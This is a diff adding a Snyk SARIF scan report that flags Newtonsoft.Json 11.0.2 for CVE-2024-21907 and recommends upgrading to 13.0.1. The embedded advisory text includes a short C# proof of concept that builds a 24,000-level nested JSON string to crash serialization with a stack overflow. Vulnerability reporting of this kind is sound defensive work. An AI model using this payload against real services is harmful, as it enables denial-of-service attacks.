@@ -1,0 +1,90 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Snyk Open Source",
+          "properties": {
+            "artifactsScanned": 1
+          },
+          "rules": [
+            {
+              "id": "SNYK-DOTNET-NEWTONSOFTJSON-2774678",
+              "shortDescription": {
+                "text": "High severity - Insecure Defaults vulnerability in Newtonsoft.Json"
+              },
+              "fullDescription": {
+                "text": "(CVE-2024-21907) Newtonsoft.Json@11.0.2"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: nuget\n* Vulnerable module: Newtonsoft.Json\n* Introduced through: nuget@1.0.0 and Newtonsoft.Json@11.0.2\n### Detailed paths\n* _Introduced through_: nuget@1.0.0 › Newtonsoft.Json@11.0.2\n# Overview\n\nAffected versions of this package are vulnerable to Insecure Defaults due to improper handling of StackOverFlow exception (SOE) whenever nested expressions are being processed.\n# PoC\n```dotnet\r\n\r\nusing System;\r\n\r\nusing System.IO;\r\nusing System.Linq;\r\nusing Newtonsoft.Json;\r\nusing Newtonsoft.Json.Linq;\r\n\r\nnamespace JsonTests\r\n{\r\n    class Program\r\n    {\r\n        static void Main(string[] args)\r\n        {\r\n            //Create a string representation of a highly nested object (JSON serialized)\r\n            int nRep = 24000;\r\n            string json = string.Concat(Enumerable.Repeat(\"{a:\", nRep)) + \"1\" +\r\n                          string.Concat(Enumerable.Repeat(\"}\", nRep));\r\n\r\n            //Parse this object (Parsing works well - no exception is being thrown)\r\n            var parsedJson = JObject.Parse(json);\r\n            \r\n            using (var ms = new MemoryStream())\r\n            using (var sWriter = new StreamWriter(ms))\r\n            using (var jWriter = new JsonTextWriter(sWriter))\r\n            {\r\n                //Trying to serialize the object will result in StackOverflowException !!!\r\n                parsedJson.WriteTo(jWriter);\r\n            }\r\n\r\n            //ToString throws StackOverflowException as well  (ToString is very unefficient - even for smaller payloads, it will occupy a lot of CPU & Memory)\r\n            //parsedJson.ToString();\r\n\r\n            //JsonConvert.SerializeObject throws StackOverflowException as well\r\n            //string a = JsonConvert.SerializeObject(parsedJson);\r\n\r\n        }\r\n    }\r\n}\r\n\r\n```\n# Remediation\nUpgrade `Newtonsoft.Json` to version 13.0.1 or higher.\n# References\n- [GitHub Commit](https://github.com/JamesNK/Newtonsoft.Json/commit/7e77bbe1beccceac4fc7b174b53abfefac278b66)\n- [GitHub Issue](https://github.com/JamesNK/Newtonsoft.Json/issues/2457)\n- [GitHub Issue](https://github.com/JamesNK/Newtonsoft.Json/issues/3010)\n- [GitHub PR](https://github.com/JamesNK/Newtonsoft.Json/pull/2462)\n- [Security Advisory](https://alephsecurity.com/vulns/aleph-2018004)\n- [Security Article](https://alephsecurity.com/2018/10/22/StackOverflowException/)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-755",
+                  "nuget"
+                ],
+                "cvssv3_baseScore": 7.5,
+                "security-severity": "7.5"
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "SNYK-DOTNET-NEWTONSOFTJSON-2774678",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable Newtonsoft.Json package with a high severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "obj/project.assets.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              },
+              "logicalLocations": [
+                {
+                  "fullyQualifiedName": "Newtonsoft.Json@11.0.2"
+                }
+              ]
+            }
+          ],
+          "fixes": [
+            {
+              "description": {
+                "text": "Upgrade to Newtonsoft.Json@13.0.1"
+              },
+              "artifactChanges": [
+                {
+                  "artifactLocation": {
+                    "uri": "obj/project.assets.json"
+                  },
+                  "replacements": [
+                    {
+                      "deletedRegion": {
+                        "startLine": 1
+                      },
+                      "insertedContent": {
+                        "text": "Newtonsoft.Json@13.0.1"
+                      }
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
